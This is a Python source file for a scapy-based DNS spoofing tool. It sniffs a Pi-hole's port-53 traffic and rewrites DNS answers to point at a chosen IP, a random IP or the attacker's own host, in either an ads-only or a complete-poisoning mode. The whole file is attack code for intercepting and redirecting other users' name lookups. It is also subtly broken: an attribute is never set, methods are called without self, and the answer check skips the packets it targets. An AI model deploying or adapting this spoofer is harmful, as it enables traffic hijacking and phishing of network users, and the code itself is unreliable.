from scapy.all import *
import signal
from TimeoutException import TimeoutException
import random
import socket

class Dns:
    'Dns class handles the DNS spoofing for all responses from Pi-hole'
    
    piIP = ""
    resultIP = ""
    verbose = False
    poisonType = ""
    
    def __init__(self, piIP, resultIP, poisonType, verbose):
        self.piIP = piIP
        self.resultIP = resultIP
        self.verbose = verbose
        return
    
    # Changes DNS responses sent by the Pi-hole for timeout seconds'
    def spoofer(self, timeout):
        if timeout > 0:
            signal.signal(signal.SIGALRM, Dns.timeoutHandler)
        try:
            signal.alarm(timeout)
            # Construct Berkeley Packet filter
            filter = "ip host " + self.piIP + " and port 53"
            sniff(filter=filter, prn=self.responder)
        except TimeoutException:
            return

    # Changes the DNS request if necessary and forwards it
    def responder(self, pkt):
        print("pkt with (src,dst)" + pkt[IP].src + "  " + pkt[IP].dst)
        # Forward requests to the dns server
        if pkt[IP].dst == self.piIP:
            send(pkt)
            return
        if pkt[IP].src != self.piIP:
            return
        print("pt = " + self.poisonType)
        print("v = " + str(self.verbose))
        if DNS in pkt and (pkt[DNS].opcode != 0 or pkt[DNS].ancount != 0):
            return
        # Check if we should change the packet
        # Other changing behaviour should be implemented here
        if (self.poisonType == "ads" and pkt[DNS].rdata == self.piIP) or self.poisonType == "complete":
            if self.verbose:
                print("Changed response for {} into resulting IP {}".format(pkt[DNS][DNSRR].rrname, resultIP))
            # Change the packet
            pkt[DNS].rdata = getIP(self.resultIP)
        # Always forward the (possibly changed) answer
        send(pkt)
        return

    def getIP(IP):
        if IP == "random":
            result = ""
            result += str(random.randint(0,255))
            result += "."
            result += str(random.randint(0,255))
            result += "."
            result += str(random.randint(0,255))
            result += "."
            result += str(random.randint(0,255))
            return result
        elif IP == "own":
            return str(socket.gethostbyname(socket.gethostname()))
        else:
            return IP

    def timeoutHandler(signum, frame):
        raise TimeoutException("Spoofing timeout")

    pass
